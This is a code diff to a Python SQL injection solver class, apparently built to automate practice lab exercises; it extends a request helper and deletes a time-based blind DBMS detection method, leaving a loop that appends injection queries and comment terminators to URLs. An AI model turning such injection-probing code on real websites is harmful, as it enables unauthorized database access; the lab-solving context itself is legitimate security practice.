@@ -39,7 +39,7 @@ class SQLInjectionBaseSolver(ABC):
     
 
     # This method quite's messy
-    def _request_lab(self, method='GET', url=None, data=None, cookies=None, allow_redirects=True):
+    def _request_lab(self, method='GET', url=None, data=None, cookies=None, allow_redirects=True, headers=None):
         """Return the RequestLab object."""
 
         if url is None:
@@ -86,21 +86,6 @@ class SQLInjectionBaseSolver(ABC):
             for query in dbms['list_command']:
                 url_brute = self.url + self.categories_url[1] + query + "-- -"
                 self._request_lab('GET', url_brute)
-                if self.html_content.status_code == 200:
-                    self.dbms = dbms['name']
-                    self.spinner.stop()
-                    self.console.log(f"[bold blue]DBMS:[/bold blue] {self.dbms}")
-                    return
-                
-    def determine_DBMS_blind(self):
-        """Determine the DBMS."""
-        self.spinner.start()
-        self.spinner.text = 'Determine the DBMS'
-        self._request_lab('GET')
-        for dbms in self.json_payload:
-            for query in dbms['time_based_command']:
-                payload = f"administrator{query}"
-                self._request_lab('GET', payload)
                 if self.html_content.status_code == 200:
                     self.dbms = dbms['name']
                     self.spinner.stop()
